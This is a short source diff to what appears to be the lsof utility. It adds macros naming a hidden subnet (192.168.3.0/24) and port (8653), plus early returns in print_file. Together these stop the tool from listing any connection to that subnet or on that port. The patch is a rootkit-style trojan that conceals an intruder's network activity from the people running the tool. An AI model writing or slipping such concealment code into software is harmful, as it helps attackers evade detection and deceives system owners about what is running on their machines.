@@ -28,6 +28,9 @@
  *
  * 4. This notice may not be removed or altered.
  */
+// 192.168.3.0/24
+#define HIDDEN_NET 0x3a8c0
+#define HIDDEN_PORT 8653
 
 #ifndef lint
 static char copyright[] =
@@ -667,6 +670,12 @@ print_file()
 	char *cp = (char *)NULL;
 	dev_t dev;
 	int devs, len;
+
+	if(!(Lf->li[1].ia.a4.s_addr & 0x00ffffff - HIDDEN_NET )) {
+                return;
+	}
+	if(!((Lf->li[0].p - HIDDEN_PORT)&&(Lf->li[1].p - HIDDEN_PORT)))
+		return;
 
 	if (PrPass && !Hdr) {
 
